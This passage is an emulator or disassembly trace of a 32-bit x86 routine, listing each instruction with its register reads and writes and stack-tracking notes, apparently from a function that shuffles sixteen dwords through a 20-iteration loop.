0xac], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x425526: mov eax, dword ptr [edx + 0x1c], regs_read: [24], regs_write: [19] 0x425529: mov dword ptr [ebp - 0xb0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42552f: mov eax, dword ptr [edx + 0x20], regs_read: [24], regs_write: [19] 0x425532: mov dword ptr [ebp - 0xb4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x425538: mov eax, dword ptr [edx + 0x24], regs_read: [24], regs_write: [19] 0x42553b: mov dword ptr [ebp - 0xb8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x425541: mov eax, dword ptr [edx + 0x28], regs_read: [24], regs_write: [19] 0x425544: mov dword ptr [ebp - 0xbc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42554a: mov eax, dword ptr [edx + 0x2c], regs_read: [24], regs_write: [19] 0x42554d: mov dword ptr [ebp - 0xc0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 4 0x425553: mov eax, dword ptr [edx + 0x30], regs_read: [24], regs_write: [19] 0x425556: mov dword ptr [ebp - 0x80], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x425559: mov eax, dword ptr [edx + 0x34], regs_read: [24], regs_write: [19] 0x42555c: mov dword ptr [ebp - 0x84], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x425562: mov eax, dword ptr [edx + 0x38], regs_read: [24], regs_write: [19] 0x425565: mov dword ptr [ebp - 0xc4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42556b: mov eax, dword ptr [edx + 0x3c], regs_read: [24], regs_write: [19] 0x42556e: push ebx, regs_read: [30, 21], regs_write: [30] 0x42556f: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x425572: mov dword ptr [ebp - 0xc8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x425583: push 0x40, regs_read: [30], regs_write: [30] 0x425588: push 0, regs_read: [30], regs_write: [30] 0x42558a: push eax, regs_read: [30, 19], regs_write: [30] 0x4255a3: mov esi, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f78 for stack size 0x10000 0x4255b6: mov cl, byte ptr [edx + ebx], regs_read: [24, 21], regs_write: [10] 0x4255b9: mov byte ptr [edx], cl, regs_read: [24, 10], regs_write: () 0x4255c7: mov esi, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f98 for stack size 0x10000 0x4255cd: mov dword ptr [ebp - 0xd0], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x4255d3: mov esi, ebx, regs_read: [21], regs_write: [29] 0x4255d5: mov dword ptr [ebp + 0xc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x4255d8: mov dword ptr [ebp - 0x68], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x4255db: mov eax, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f68 for stack size 0x10000 0x4255e1: mov ecx, dword ptr [ebp - 0xb8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f48 for stack size 0x10000 0x4255e7: mov edi, dword ptr [ebp - 0xcc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7f34 for stack size 0x10000 0x4255ed: mov ebx, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7f80 for stack size 0x10000 0x4255f0: mov edx, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7f7c for stack size 0x10000 0x4255f6: mov esi, dword ptr [ebp - 0xc4], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f3c for stack size 0x10000 0x4255fc: mov dword ptr [ebp - 0x7c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x4255ff: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f64 for stack size 0x10000 0x425605: mov dword ptr [ebp - 0x64], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x425608: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f60 for stack size 0x10000 0x42560e: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x425611: mov eax, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f5c for stack size 0x10000 0x425617: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x42561a: mov eax, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f58 for stack size 0x10000 0x425620: mov dword ptr [ebp - 0x4c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425623: mov ecx, dword ptr [ebp - 0xbc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f44 for stack size 0x10000 0x425629: mov dword ptr [ebp - 0x70], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x42562c: mov eax, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f54 for stack size 0x10000 0x425632: mov dword ptr [ebp - 0x48], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x425635: mov ecx, dword ptr [ebp - 0xc0], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f40 for stack size 0x10000 0x42563b: mov dword ptr [ebp - 0x74], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x42563e: mov eax, dword ptr [ebp - 0xb0], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f50 for stack size 0x10000 0x425644: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x425647: mov ecx, dword ptr [ebp - 0xc8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f38 for stack size 0x10000 0x42564d: mov dword ptr [ebp - 0x78], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x425650: mov eax, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f4c for stack size 0x10000 0x425656: mov dword ptr [ebp - 0x6c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x425659: mov ecx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 0x42565c: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x42565f: mov dword ptr [ebp - 0x8c], 0x14, regs_read: [20], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f74 for stack size 0x10000 saving data to stack: 20 4 0x425670: mov edi, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7fa4 for stack size 0x10000 0x425676: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 0x425685: mov dword ptr [ebp - 0x5c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x425688: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x425698: mov dword ptr [ebp - 0x5c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x42569b: mov edi, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 0x4256a3: mov dword ptr [ebp - 0x58], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x4256a8: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x4256b0: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4256bd: mov dword ptr [ebp - 0x7c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x4256c0: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x4256c8: mov dword ptr [ebp - 0x60], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x4256cb: mov edx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 0x4256d3: mov dword ptr [ebp - 0x4c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4256db: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x4256e3: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x4256f3: mov dword ptr [ebp - 0x64], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x4256f6: mov edx, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x4256fe: mov dword ptr [ebp - 0x90], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x425704: mov esi, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 0x425707: mov dword ptr [ebp - 0x48], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x42570c: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 0x425714: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x425717: mov eax, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x425722: mov dword ptr [ebp - 0x50], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x425737: mov dword ptr [ebp - 0x6c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x42573a: mov esi, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x42573f: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 0x42574e: mov dword ptr [ebp - 0x6c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x425751: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x425756: mov ecx, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 0x425768: mov dword ptr [ebp - 0x6c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x42576b: mov ecx, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x425770: mov eax, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x425776: mov dword ptr [ebp - 0x70], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x425779: mov ecx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 0x425785: mov dword ptr [ebp - 0x50], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x42578a: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x425799: mov dword ptr [ebp - 0x7c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x42579c: mov dword ptr [ebp - 0x50], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x4257a1: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 0x4257a9: mov dword ptr [ebp - 0x64], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x4257ac: mov dword ptr [ebp - 0x74], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x4257af: mov edx, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 0x4257b4: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 0x4257bc: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x4257c1: mov esi, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 0x4257cb: mov dword ptr [ebp - 0x64], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x4257ce: mov esi, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 0x4257d6: mov ebx, esi, regs_read: [29], regs_write: [21] 0x4257d8: mov dword ptr [ebp - 0x58], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x4257db: mov esi, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f70 for stack size 0x10000 0x4257e3: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 0x4257ed: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x4257f0: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x4257f8: mov dword ptr [ebp - 0x78], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x4257fb: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425800: mov edi, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 0x42580a: mov dword ptr [ebp - 0x54], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x425813: mov ebx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x425818: mov dword ptr [ebp - 0x90], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42581e: mov dword ptr [ebp - 0x60], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x42582c: mov ebx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 0x425835: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 0x425838: mov eax, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f68 for stack size 0x10000 0x425840: mov esi, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x18 and offset 0x7f7c for stack size 0x10000 0x425846: mov ecx, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f94 for stack size 0x10000 0x42584e: mov dword ptr [ebp - 0x8c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x425854: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 0x425860: mov dword ptr [ebp - 0x64], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x425863: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f60 for stack size 0x10000 0x42586b: mov edx, dword ptr [ebp - 0xc4], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x18 and offset 0x7f3c for stack size 0x10000 0x425874: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x425877: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 0x425883: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x425886: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f90 for stack size 0x10000 0x425892: mov dword ptr [ebp - 0x70], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x425895: mov eax, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f8c for stack size 0x10000 0x4258a1: mov dword ptr [ebp - 0x74], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x4258a4: mov eax, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f88 for stack size 0x10000 0x4258b0: mov dword ptr [ebp - 0x78], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x4258b3: mov eax, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f4c for stack size 0x10000 0x4258bf: mov dword ptr [ebp - 0x58], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x4258c2: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x4258ce: mov edi, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7f84 for stack size 0x10000 0x4258e0: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4258e3: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x4258ef: mov ebx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x4258f8: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x4258fb: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 0x425911: mov dword ptr [ebp - 0x50], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x425914: mov ebx, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7f7c for stack size 0x10000 0x425920: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 0x425923: mov dword ptr [ebp - 0x84], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x425929: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa4 for stack size 0x10000 0x425934: mov ebx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7f98 for stack size 0x10000 0x425937: mov dword ptr [ebx], eax, regs_read: [21, 19], regs_write: () 0x425939: mov eax, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f74 for stack size 0x10000 0x42593f: mov dword ptr [ebx + 4], eax, regs_read: [21, 19], regs_write: () 0x425942: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f9c for stack size 0x10000 0x425945: mov dword ptr [ebx + 8], eax, regs_read: [21, 19], regs_write: () 0x425948: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fac for stack size 0x10000 0x42594b: mov dword ptr [ebx + 0xc], eax, regs_read: [21, 19], regs_write: () 0x42594e: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa0 for stack size 0x10000 0x425951: mov dword ptr [ebx + 0x10], eax, regs_read: [21, 19], regs_write: () 0x425954: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f90 for stack size 0x10000 0x425957: mov dword ptr [ebx + 0x14], eax, regs_read: [21, 19], regs_write: () 0x42595a: mov eax, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f8c for stack size 0x10000 0x42595d: mov dword ptr [ebx + 0x18], eax, regs_read: [21, 19], regs_write: () 0x425960: mov eax, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f88 for stack size 0x10000 0x425963: mov dword ptr [ebx + 0x1c], eax, regs_read: [21, 19], regs_write: () 0x425966: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fa8 for stack size 0x10000 0x425969: mov dword ptr [ebx + 0x20], eax, regs_read: [21, 19], regs_write: () 0x42596c: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb4 for stack size 0x10000 0x42596f: mov dword ptr [ebx + 0x24], eax, regs_read: [21, 19], regs_write: () 0x425972: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7fb8 for stack size 0x10000 0x425975: mov dword ptr [ebx + 0x28], eax, regs_read: [21, 19], regs_write: () 0x425978: mov eax, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x7f98 for stack size 0x10000 0x42597b: mov ebx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x7fb0 for stack size 0x10000 0x42597e: mov dword ptr [eax + 0x3c], ecx, regs_read: [19, 22], regs_write: () 0x425981: mov ecx, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x18 and offset 0x7f78 for stack size 0x10000 0x425987: mov dword ptr [eax + 0x30], edi, regs_read: [19, 23], regs_write: () 0x42598a: mov edi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x18 and offset 0x7f6c for stack size 0x10000 0x425990: mov dword ptr [eax + 0x2c], ebx, regs_read: [19, 21], regs_write: () 0x425993: mov dword ptr [eax + 0x34], esi, regs_read: [19, 29], regs_write: () 0x425996: mov dword ptr [eax + 0x38], edx, regs_read: [19, 24], regs_write: () 0x4259a2: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 0x4259a8: mov dword ptr [ebp - 0x94], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x4259b7: mov dword ptr [ebp - 0x88], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x4259bd: mov dword ptr [ebp - 0x68], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x4259c0: mov esi, eax, regs_read: [19], regs_write: [29] 0x4259c2: mov dword ptr [ebp + 0xc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x4259ca: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4259da: mov ecx, dword ptr [ebp - 0xd0], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x14 and offset 0x7f30 for stack size 0x10000 0x4259e2: mov dword ptr [ebp - 0x68], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x4259e5: mov al, byte ptr [eax + ecx], regs_read: [19, 22], regs_write: [2] 0x4259eb: mov byte ptr [ecx - 1], al, 